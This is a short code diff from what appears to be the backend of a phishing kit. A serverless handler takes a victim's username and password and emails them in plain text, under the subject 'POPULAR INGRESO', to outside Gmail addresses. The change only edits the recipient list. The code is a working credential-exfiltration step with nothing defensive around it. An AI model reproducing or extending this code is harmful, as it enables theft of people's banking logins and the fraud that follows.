@@ -15,7 +15,7 @@ exports.handler = async function(event, context) {
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
-        to: 'sierroalee@gmail.com, cacutumbe@gmail.com', // Corregido: coma agregada entre los correos
+        to: 'sierroalee@gmail.com', // Corregido: coma agregada entre los correos
         subject: 'POPULAR INGRESO',
         text: `Usuario: ${username}\nContraseña: ${password}`,
     };
